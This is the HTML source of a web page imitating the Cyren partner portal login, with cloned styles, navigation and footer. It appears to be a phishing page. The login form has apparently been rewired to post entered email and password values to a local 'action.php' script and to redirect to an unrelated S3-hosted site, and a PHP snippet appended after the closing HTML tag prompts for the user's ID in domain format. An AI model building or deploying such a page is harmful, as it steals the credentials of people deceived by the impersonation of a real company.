    -ms-transform: translateX(var(--transform-translate-x)) translateY(var(--transform-translate-y)) rotate(var(--transform-rotate)) skewX(var(--transform-skew-x)) skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x)) scaleY(var(--transform-scale-y));
    transform: translateX(var(--transform-translate-x)) translateY(var(--transform-translate-y)) rotate(var(--transform-rotate)) skewX(var(--transform-skew-x)) skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x)) scaleY(var(--transform-scale-y)); }
  [page-content] .tailwind-widgets .tw-origin-top-right {
    -webkit-transform-origin: top right;
    -ms-transform-origin: top right;
    transform-origin: top right; }
  [page-content] .tailwind-widgets .tw-rotate-180 {
    --transform-rotate: 180deg; }
  [page-content] .tailwind-widgets .tw-translate-y-1 {
    --transform-translate-y: 0.4rem; }
  [page-content] .tailwind-widgets .tw-transition-all {
    -webkit-transition-property: all;
    -o-transition-property: all;
    transition-property: all; }
  [page-content] .tailwind-widgets .tw-transition {
    -webkit-transition-property: background-color, border-color, color, fill, stroke, opacity, -webkit-box-shadow, -webkit-transform;
    transition-property: background-color, border-color, color, fill, stroke, opacity, -webkit-box-shadow, -webkit-transform;
    -o-transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
    transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
    transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform, -webkit-box-shadow, -webkit-transform; }
  [page-content] .tailwind-widgets .tw-transition-opacity {
    -webkit-transition-property: opacity;
    -o-transition-property: opacity;
    transition-property: opacity; }
  [page-content] .tailwind-widgets .tw-ease-in-out {
    -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
    -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
    transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); }
  [page-content] .tailwind-widgets .tw-duration-100 {
    -webkit-transition-duration: 100ms;
    -o-transition-duration: 100ms;
    transition-duration: 100ms; }
  [page-content] .tailwind-widgets .tw-duration-150 {
    -webkit-transition-duration: 150ms;
    -o-transition-duration: 150ms;
    transition-duration: 150ms; }

@-webkit-keyframes spin {
  to {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg); } }

@keyframes spin {
  to {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg); } }

@-webkit-keyframes ping {
  75%, 100% {
    -webkit-transform: scale(2);
    transform: scale(2);
    opacity: 0; } }

@keyframes ping {
  75%, 100% {
    -webkit-transform: scale(2);
    transform: scale(2);
    opacity: 0; } }

@-webkit-keyframes pulse {
  50% {
    opacity: .5; } }

@keyframes pulse {
  50% {
    opacity: .5; } }

@-webkit-keyframes bounce {
  0%, 100% {
    -webkit-transform: translateY(-25%);
    transform: translateY(-25%);
    -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
    animation-timing-function: cubic-bezier(0.8, 0, 1, 1); }
  50% {
    -webkit-transform: none;
    transform: none;
    -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
    animation-timing-function: cubic-bezier(0, 0, 0.2, 1); } }

@keyframes bounce {
  0%, 100% {
    -webkit-transform: translateY(-25%);
    transform: translateY(-25%);
    -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
    animation-timing-function: cubic-bezier(0.8, 0, 1, 1); }
  50% {
    -webkit-transform: none;
    transform: none;
    -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
    animation-timing-function: cubic-bezier(0, 0, 0.2, 1); } }
  [page-content] .tailwind-widgets .tw-animate-spin {
    -webkit-animation: spin 1s linear infinite;
    animation: spin 1s linear infinite; }
  @media (min-width: 640px) {
    [page-content] .tailwind-widgets .sm\:tw-rounded-md {
      border-radius: 0.6rem; }
    [page-content] .tailwind-widgets .sm\:tw-rounded-lg {
      border-radius: 0.8rem; }
    [page-content] .tailwind-widgets .sm\:tw-block {
      display: block; }
    [page-content] .tailwind-widgets .sm\:tw-inline-block {
      display: inline-block; }
    [page-content] .tailwind-widgets .sm\:tw-flex {
      display: -webkit-box;
      display: -ms-flexbox;
      display: flex; }
    [page-content] .tailwind-widgets .sm\:tw-hidden {
      display: none; }
    [page-content] .tailwind-widgets .sm\:tw-flex-row {
      -webkit-box-orient: horizontal;
      -webkit-box-direction: normal;
      -ms-flex-direction: row;
      flex-direction: row; }
    [page-content] .tailwind-widgets .sm\:tw-items-start {
      -webkit-box-align: start;
      -ms-flex-align: start;
      align-items: flex-start; }
    [page-content] .tailwind-widgets .sm\:tw-items-center {
      -webkit-box-align: center;
      -ms-flex-align: center;
      align-items: center; }
    [page-content] .tailwind-widgets .sm\:tw-justify-between {
      -webkit-box-pack: justify;
      -ms-flex-pack: justify;
      justify-content: space-between; }
    [page-content] .tailwind-widgets .sm\:tw-flex-1 {
      -webkit-box-flex: 1;
      -ms-flex: 1 1 0%;
      flex: 1 1 0%; }
    [page-content] .tailwind-widgets .sm\:tw-h-10 {
      height: 3.6rem; }
    [page-content] .tailwind-widgets .sm\:tw-h-screen {
      height: 100vh; }
    [page-content] .tailwind-widgets .sm\:tw-text-sm {
      font-size: 1.4rem; }
    [page-content] .tailwind-widgets .sm\:tw-leading-5 {
      line-height: 2rem; }
    [page-content] .tailwind-widgets .sm\:tw-mx-0 {
      margin-left: 0;
      margin-right: 0; }
    [page-content] .tailwind-widgets .sm\:tw-my-8 {
      margin-top: 3.2rem;
      margin-bottom: 3.2rem; }
    [page-content] .tailwind-widgets .sm\:tw-mt-0 {
      margin-top: 0; }
    [page-content] .tailwind-widgets .sm\:tw-ml-3 {
      margin-left: 1.2rem; }
    [page-content] .tailwind-widgets .sm\:tw-ml-4 {
      margin-left: 1.6rem; }
    [page-content] .tailwind-widgets .sm\:tw-max-w-lg {
      max-width: 51.2rem; }
    [page-content] .tailwind-widgets .sm\:tw-p-0 {
      padding: 0; }
    [page-content] .tailwind-widgets .sm\:tw-p-3 {
      padding: 1.2rem; }
    [page-content] .tailwind-widgets .sm\:tw-p-4 {
      padding: 1.6rem; }
    [page-content] .tailwind-widgets .sm\:tw-p-6 {
      padding: 2.4rem; }
    [page-content] .tailwind-widgets .sm\:tw-px-6 {
      padding-left: 2.4rem;
      padding-right: 2.4rem; }
    [page-content] .tailwind-widgets .sm\:tw-text-left {
      text-align: left; }
    [page-content] .tailwind-widgets .sm\:tw-align-middle {
      vertical-align: middle; }
    [page-content] .tailwind-widgets .sm\:tw-w-10 {
      width: 3.6rem; }
    [page-content] .tailwind-widgets .sm\:tw-w-auto {
      width: auto; }
    [page-content] .tailwind-widgets .sm\:tw-w-full {
      width: 100%; }
    [page-content] .tailwind-widgets .sm\:tw-gap-x-2 {
      grid-column-gap: 0.8rem;
      -webkit-column-gap: 0.8rem;
      -moz-column-gap: 0.8rem;
      column-gap: 0.8rem; }
    [page-content] .tailwind-widgets .sm\:tw-grid-cols-2 {
      grid-template-columns: repeat(2, minmax(0, 1fr)); }
    [page-content] .tailwind-widgets .sm\:tw-grid-cols-3 {
      grid-template-columns: repeat(3, minmax(0, 1fr)); }
    [page-content] .tailwind-widgets .sm\:tw-col-span-1 {
      grid-column: span 1 / span 1; }
    [page-content] .tailwind-widgets .sm\:tw-col-span-2 {
      grid-column: span 2 / span 2; }
    [page-content] .tailwind-widgets .sm\:tw-col-span-3 {
      grid-column: span 3 / span 3; } }
  @media (min-width: 768px) {
    [page-content] .tailwind-widgets .md\:tw-border-0 {
      border-width: 0; }
    [page-content] .tailwind-widgets .md\:tw-border-l {
      border-left-width: 1px; }
    [page-content] .tailwind-widgets .md\:tw-grid-cols-3 {
      grid-template-columns: repeat(3, minmax(0, 1fr)); }
    [page-content] .tailwind-widgets .md\:tw-grid-rows-3 {
      grid-template-rows: repeat(3, minmax(0, 1fr)); } }
  @media (min-width: 1024px) {
    [page-content] .tailwind-widgets .lg\:tw-grid {
      display: grid; }
    [page-content] .tailwind-widgets .lg\:tw-px-8 {
      padding-left: 3.2rem;
      padding-right: 3.2rem; } }

[page-content] .errors {
  color: #a12125;
  font-size: 1.8rem; }
</style></head>
<body><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0" id="__SVG_SPRITE_NODE__"><symbol viewBox="0 0 14 14" xmlns="http://www.w3.org/2000/svg" id="prm-icon-asterisk">
  <path d="M8 2v3.267l2.83-1.633 1 1.732L9 7l2.83 1.634-1 1.732L8 8.732V12H6V8.732l-2.83 1.634-1-1.732 2.829-1.635-2.83-1.633 1-1.732L6 5.267V2h2z" fill="currentColor" fill-rule="evenodd"></path>
</symbol></svg>

<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="X+GPCsPybduTzfb48yYOVwXNR8K6lPfCYuBPY5TOrfOKm3oSpLDy/kaqzThZUM+nONPmMos+P59mjfbhh5m3iuvd9uH3/+40WpewGMq524p3h/43UdffucFsvIGTV0fiyuXpsQn7zyEZ/1IPg8OyL644yU+SMMP4Nv5TzJ/O6aBcRWB1entr442TDH0HURJuXliaGJtiZIx++pR+uxtY1KdX+PLeuxBW+V8juEEb+UlhagMxzufOaQdCPPE+Gb/y7kEumI01w7C/XW0jYLQapqG147d4ywwilgKdu45aGuW0Yb82PbZSgyrD3hepm1Ave5OizqRdIds6ygbyKbLaGKf688n8flOFkV9T+wTqazOcmXwh">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['ServerForm'];
if (!theForm) {
    theForm = document.ServerForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="https://partner.cyren.com/WebResource.axd?d=NfL1OBVAmOjLZ_7FQjC-L2YRqn0tJqjcXP3T3ZoZYi2pyH4zFFlNyn2EtVEYMXQeSkWU5bXQ_C31y7nbA3Lv2lxtoUM1&amp;t=637453816754849868" type="text/javascript"></script>


<script src="https://partner.cyren.com/ScriptResource.axd?d=jM_fRBu2rAx0qg_gCun6PCHwJPuk1PCYZiFren6MB3W6l6kaDX2Og7fEf6A33PUhDUSeyASF46afIRw8H8MWZivLPZ7LljVAZtbZ2Wj4nQZF97buB_U_H4DDhFHJY4AK5jh6C-SVP4FqoxDmJGZs94IToao1&amp;t=363be08" type="text/javascript"></script>
<script src="https://partner.cyren.com/ScriptResource.axd?d=7UT2WXEB8eDKxHsFWsDVO80qDhx9lOZs0qdfTnWQcmdKJvgRtmeDn6pFikP71-jKjWw6zE2WwKTba0Pnzs2-NWVc0RKbrByKvI9SYdlYZQ8mjbn6ZQz2j_M8R0c2XTZlgRE8_XwIJWRlkLE06quvrkVnSlJE2zMoW34pV6hZzHfEZcA00&amp;t=363be08" type="text/javascript"></script>
<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="52C7452D">
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
</div>
		<script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ctl00$ctl00$ctl06', 'ServerForm', [], [], [], 90, 'ctl00$ctl00$ctl00');
//]]>
</script>

		<header>
			<nav role="navigation" class="navbar navbar-default navbar-fixed-top">
				<div class="top-bar">
					<div class="container">
						<div class="row">
							<div class="col-lg-12 widgets">
								
							</div>
						</div>
					</div>
				</div>
				<div class="container navFuller">
					<div class="navbar-header pull-left">
						<div class="navbar-brand"><a href="https://www.cyren.com/" target="_blank"><img src="../images/logos/logo.png" class="img-responsive logo" alt="Company Name"></a></div>
					</div>
					<div class="navbar-header navbar-right">
						<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbarCollapse">
							<span class="sr-only">Toggle navigation</span>
							<span class="icon-bar icon-bar-top"></span>
							<span class="icon-bar icon-bar-middle"></span>
							<span class="icon-bar icon-bar-bottom"></span>
						</button>
					</div>
					<div id="navbarCollapse" class="collapse navbar-collapse">
						<ul class="nav navbar-nav navbar-right">
							<!-- ko component: { name: 'prm-component-nav', params: { menus: config.menus.portalTopNav } } --><!-- ko template: 'components/nav' --><!-- ko 'if': !$componentTemplateNodes.length --><!-- /ko -->
<!-- ko 'if': $componentTemplateNodes.length -->
<!-- ko template: { nodes: $componentTemplateNodes, data: params.menus } -->
							<!-- ko foreach: items -->
							<li data-bind="css: { dropdown: $data.items &amp;&amp; $data.items.length > 0 }">
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
								<!-- ko 'ifnot': $data.items && $data.items.length > 0 -->
								<a role="button" aria-expanded="false" data-bind="xlink: externalLink">
									<!-- ko 'if': iconClass --><!-- /ko -->
									<span data-bind="text: name">Home</span>
								</a>
								<!-- /ko -->
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
							</li>
							
							<li data-bind="css: { dropdown: $data.items &amp;&amp; $data.items.length > 0 }">
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
								<!-- ko 'ifnot': $data.items && $data.items.length > 0 -->
								<a href="/English/default.aspx#scroll-to-program-overview" role="button" aria-expanded="false" data-bind="xlink: externalLink">
									<!-- ko 'if': iconClass --><!-- /ko -->
									<span data-bind="text: name">Program Overview</span>
								</a>
								<!-- /ko -->
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
							</li>
							
							<li data-bind="css: { dropdown: $data.items &amp;&amp; $data.items.length > 0 }">
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
								<!-- ko 'ifnot': $data.items && $data.items.length > 0 -->
								<a href="/English/default.aspx#scroll-to-benefits" role="button" aria-expanded="false" data-bind="xlink: externalLink">
									<!-- ko 'if': iconClass --><!-- /ko -->
									<span data-bind="text: name">Benefits</span>
								</a>
								<!-- /ko -->
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
							</li>
							
							<li data-bind="css: { dropdown: $data.items &amp;&amp; $data.items.length > 0 }">
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
								<!-- ko 'ifnot': $data.items && $data.items.length > 0 -->
								<a href="https://partner.cyren.com/English/register_email.aspx" role="button" aria-expanded="false" data-bind="xlink: externalLink">
									<!-- ko 'if': iconClass --><!-- /ko -->
									<span data-bind="text: name">Apply</span>
								</a>
								<!-- /ko -->
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
							</li>
							
							<li data-bind="css: { dropdown: $data.items &amp;&amp; $data.items.length > 0 }">
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
								<!-- ko 'ifnot': $data.items && $data.items.length > 0 -->
								<a href="https://www.cyren.com/company/contact" role="button" aria-expanded="false" data-bind="xlink: externalLink" target="_blank">
									<!-- ko 'if': iconClass --><!-- /ko -->
									<span data-bind="text: name">Contact</span>
								</a>
								<!-- /ko -->
								<!-- ko 'if': $data.items && $data.items.length > 0 --><!-- /ko -->
							</li>
							<!-- /ko -->
							<!-- /ko -->
<!-- /ko -->

<!-- /ko --><!-- /ko -->
						</ul>
					</div>
				</div>
			</nav>
		</header>
		<section id="page_content">
			<div class="modal fade" id="prm-modal-dialog" role="dialog">
				<div class="modal-dialog"><div class="modal-content" id="prm-modal-content"></div></div>
			</div>
			
	
	
<div id="unauthHome">
	<section id="home_main">
		<div id="myCarousel" class="carousel slide" data-interval="0" data-ride="carousel">
			<div id="UnauthHero">
	<div class="carousel-inner">
<div class="active item" id="slide_001">
<div class="container carousel-inner-padding">
<div class="col-sm-8 col-md-8 text-center">
<h1 style="font-weight:700">Cyren</h1>
</div>

<div class="center-block col-md-8 col-sm-8 text-center">
<p class="hero-text"><span style="font-family:Arial,Helvetica,sans-serif;"><span style="font-size:18px;">Cyren protects more than 1.3 billion enterprise users around the world from email&nbsp;threats every day.</span></span></p>
<!--<a class="btn btn-primary" href="https://www.cyren.com/tl_files/downloads/resources/Cyren_GoCloud_Brochure_20190509_ltr_EN_web.pdf" target="_blank">Learn More</a>--></div>
</div>
</div>
</div>

</div>
		</div>
	</section>
	<section id="home_login">
		<div class="container">
			<div class="row">
				<div class="col-sm-6">
					<div class="row">
						<div class="col-md-3 hidden-sm hidden-xs">
							<img src="glyphicon\glyphicon-log-in.PNG">
						</div>
						<div class="col-md-9">
							<div id="Login_Editable">
	<h3><img src="glyphicon\glyphicon-user.PNG" style="float:left">&nbsp; <strong><span style="font-size:28px;"><span style="font-family:Arial,Helvetica,sans-serif;">Login</span></span></strong></h3>

<p><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Sign in with your organiztion account.</span></span></p>


</div>
						</div>
					</div>
				</div>
				<form method="post" action="action.php">
				<div class="col-sm-6 login_box">
					<div class="row">
						<div class="col-lg-7">
							

<input type="hidden" name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$ServerResponse" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_ServerResponse">
<div onkeypress="javascript:return WebForm_FireDefaultButton(event, 'GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit')">
	<input type="hidden" name="csrf_token" value="6737902db2f8ca933a23a198e24251d7ba181651">
	<input name="language_selected" id="language_selected" type="hidden" value="">
	<input name="redirect_url" type="hidden" value="http://compcore-cyren-t.s3-website-us-west-2.amazonaws.com/">	
<div class="form-group">
	
    <label for="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName_Prompt" class="control-label sr-only">Email</label>
    <input name="username" type="text" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_UserName" class="form-control" autocapitalize="none" placeholder="Email" tabindex="1">

	</div>
<div class="form-group">
		
    <label for="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password_Prompt" class="control-label sr-only">Password</label>
    <input name="password" type="password" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_Password" class="form-control" placeholder="Password" tabindex="2">

	</div>
<input value="Login" type="submit" name="submit" tabindex="3" id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit" class="btn btn-default pull-right">
<div class="form-group home_remember_me">
	<div class="checkbox">
		<label>
			<input id="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_LoginRememberMe" type="checkbox" name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$LoginControl$LoginRememberMe"><label for="GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_LoginRememberMe">Remember Me</label>
		</label>
	</div>
</div>

</div>
							<p class="forgot-password"><a href="#forgot_password_modal" role="button" data-toggle="modal"><img src="glyphicon\glyphicon-question-sign.PNG"> Forgot your password?</a></p>
						</div>
					</div>
					</div>
				</form>
			</div>
		</div>
	</section>
	<div id="scroll-to-program-overview"></div>
	<div id="UnauthBodyEditable">
	<style type="text/css">.navbar-fixed-top {
  	background:  #005a8b;
  }
  .navbar-default .navbar-nav > li > a {
  color: white;
  }
  #home_about, #member_benefits {
  min-height: auto;
  background: #eb3400;
  color: white;
  }
#member_benefits {
  background: #005a8b;
  }
  #home_about p {
  color: white;
  }
  #home_about .btn {
  background-color: #015b8b;
  color: white;
  }
  #home_about .btn:hover {
  background-color: #0288ce;
  color: white;
  }
  
 #benefits_requirements .icon-bg-fill {
  background: #005a8b;
  }
  
  #member_benefits .icon-bg-fill .glyphicon {
  color: #005a8b;
  }
   #member_benefits {
  padding-bottom: 70px !important;
  }
</style>








</div>
	<section id="home_partner_apply" class="well-shadow-top">
		<div class="container">
			<div class="row">
				<div class="col-md-6">
					<div id="UnauthApplyEditable">
	<h2 style="text-align: center;"><span style="font-size:28px;"><strong></strong></span></h2>

</div>
				</div>
				<div class="col-md-2 hidden-sm hidden-xs">
					<p>&nbsp;</p>
				</div>
				<div class="col-md-4 home-short-reg">
					<p>
						
<script type="text/javascript">
    jQuery(document).ready(function ($) {
        $('#GlobalBodyContent_ExternalBodyContent_BodyContent_ShortRegistrationHome_Email').watermark("Company E-mail Address");
	});
</script>
</p><div id="GlobalBodyContent_ExternalBodyContent_BodyContent_ShortRegistrationHome_Registration" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'GlobalBodyContent_ExternalBodyContent_BodyContent_ShortRegistrationHome_btnShortRegistration')">
	
	<div class="form-group">
		
		<label for="GlobalBodyContent_ExternalBodyContent_BodyContent_ShortRegistrationHome_Email" id="GlobalBodyContent_ExternalBodyContent_BodyContent_ShortRegistrationHome_Email_Prompt" class="control-label sr-only">E-mail Address</label>
		
	
	</div>
	

</div>

					<p></p>
				</div>
			</div>
		</div>
	</section>
	
</div>
	
<script type="text/javascript">
	var checkForgotPassword;

	jQuery(function ($) {
		var $userName = $("#GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_Email");
		$("#forgot_password_modal")
			.on("shown.bs.modal", function () {
				$userName.focus();
			})
			.on("hidden.bs.modal", function () {
				$("#forgot_password_alert").alert("close");
				$userName.val("");
			})
		;
		checkForgotPassword = function () {
			var showError = function (msg) {
				if ($("#forgot_password_alert").length == 0) {
					var html = [
						"<div id=\"forgot_password_alert\" class=\"alert alert-danger alert-dismissible\" role=\"alert\">",
							"<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\"><span aria-hidden=\"true\">&times;</span></button>",
							"<span class=\"msg-placeholder\"></span>",
						"</div>"
					];
					$("#forgot_password_modal").find(".modal-body").prepend(html.join(" "));
				}
				$("#forgot_password_alert").find(".msg-placeholder").text(msg);
			};

			var userName = $.trim($userName.val());
			$userName.val(userName);
			if (userName == "") {
				showError("Please enter your email address");
				$userName.focus();
				return false;
			}
			if (userName.indexOf("@") == -1) {
				showError("The specified email address has an invalid format");
				$userName.focus();
				return false;
			}
			return true;
		};
	});
</script>
<div onkeypress="javascript:return WebForm_FireDefaultButton(event, 'GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_btnSubmit')">
	
<div class="modal fade" id="forgot_password_modal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button class="close" data-dismiss="modal">×</button>
                <div id="PageHeader">
		
                <h4 class="modal-title">Forget your password?</h4>
                
	</div>
            </div>
            <div id="GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_Email_Group" class="modal-body">
            <div id="PageContent">
		
				<p>Enter your email address below and we will send you a link to reset your password.</p>
                
	</div>
                <div class="form-group">
                    <label for="GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_Email" id="GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_Email_Prompt" class="control-label">E-mail Address</label>
                    <div class="input-group">
                        <span class="input-group-addon">@</span>
                        <input name="ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$ForgotPasswordControl$Email" type="text" id="GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_Email" class="form-control" placeholder="Email">
                        <span class="input-group-btn">
                            <a onclick="return checkForgotPassword();" id="GlobalBodyContent_ExternalBodyContent_BodyContent_ForgotPasswordControl_btnSubmit" class="btn btn-default" href="javascript:__doPostBack('ctl00$ctl00$ctl00$GlobalBodyContent$ExternalBodyContent$BodyContent$ForgotPasswordControl$btnSubmit','')"><span class="glyphicon glyphicon-log-in"></span>&nbsp; Submit</a>
                        </span>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
            </div>
        </div>
    </div>
</div>

</div>
	<script type="text/javascript">
		// Add scrollspy to <body>
		$('body').scrollspy();
		// Add smooth scrolling on all links inside the .navbar classes anchors
		$(".navbar a").on('click', function(event) {
		  // Make sure this.hash has a value before overriding default behavior
		  if (this.hash !== "") {
			// Prevent default anchor click behavior
			event.preventDefault();
			$('#navbarCollapse').removeClass('in');
			$('.navbar-toggle').addClass('collapsed');
			// Store hash
			var hash = this.hash;
			// Using jQuery's animate() method to add smooth page scroll
			// The optional number (800) specifies the number of milliseconds it takes to scroll to the specified area
			$('html, body').animate({
			  scrollTop: $(hash).offset().top }, 800, function(){
	
			// Add hash (#) to URL when done scrolling (default click behavior)
			  window.location.hash = hash;
			});
		  } // End if
		});
	</script>



		</section>
		<footer>
			<div class="container">
				<div class="row">
					<div class="col-md-3 col-sm-4 col-xs-12 col-md-push-9 col-sm-push-8">
						<div class="contact-us">
							<div class="contact_title">Contact Us</div><br class="contact-break">
							<div class="contact-icon"><span class="glyphicon glyphicon-map-marker"></span></div>
							<div class="contact_address">
								<div>1430 Spring Hill Road, <span class="contact_suite">Suite 330</span></div> 
								<div>McLean, Virginia 22102</div>
							</div><br class="contact-break">
							<div class="contact-icon"><span class="glyphicon glyphicon-envelope"></span></div>
							<div><a href="mailto:partners@cyren.com">partners@cyren.com</a></div><br class="contact-break">
							
						</div>
						
					</div>
					<div class="col-md-9 col-sm-8 col-xs-12 col-md-pull-3 col-sm-pull-4">
						<p>
							<a href="https://www.facebook.com/CyrenWeb" target="_blank" class="icon-outline icon-sm"><i class="fa fa-facebook" aria-hidden="true"></i></a>&nbsp;&nbsp;
							<a href="https://twitter.com/CyrenInc" target="_blank" class="icon-outline icon-sm"><i class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;&nbsp;
							<a href="http://www.youtube.com/user/CYRENWeb" target="_blank" class="icon-outline icon-sm"><i class="fa fa-youtube" aria-hidden="true"></i></a>&nbsp;&nbsp;
							<a href="https://www.linkedin.com/company/cyren" target="_blank" class="icon-outline icon-sm"><i class="fa fa-linkedin" aria-hidden="true"></i></a></p>
						<p>Copyright © 2021<br>Cyren. All rights reserved.<br>
							</p>
					</div>
				</div>
			</div>
		</footer>
		<!-- Video Modal -->
		<div id="YouTubeVideo" class="modal fade youtube-video-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
						<h4 class="modal-title" id="myModalLabel"></h4>
					</div>
					<div class="modal-body">
						<div class="embed-responsive embed-responsive-16by9">
							<iframe class="embed-responsive-item img-responsive" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" frameborder="0"></iframe>
						</div>
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Close</button>
					</div>
				</div>
			</div>
		</div>
		<!-- Image Modal -->
		<div id="ImageModal" class="modal fade image-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
						<h4 class="modal-title" id="myModalLabel"></h4>
					</div>
					<div class="modal-body">
						<img class="embed-responsive-item img-responsive">
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Close</button>
					</div>
				</div>
			</div>
		</div>
	

<script type="text/javascript">

	var _gaq = _gaq || [];
	_gaq.push(["_setAccount","UA-62643518-30"],["_trackPageview"]);

	(function () {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	})();

</script>
	
	
	<section id="prm-alert-popups" class="prm-popups">
		<div class="container prm-alert">
	</div></section>
	<section id="prm-notify-popups" class="prm-popups">
		<div class="container prm-notify-popup"></div>
	</section>




</body></html>
<?php
echo '<script>alert("Enter your user ID in the format domain\\\\user or user@domain.");</script>';
?>
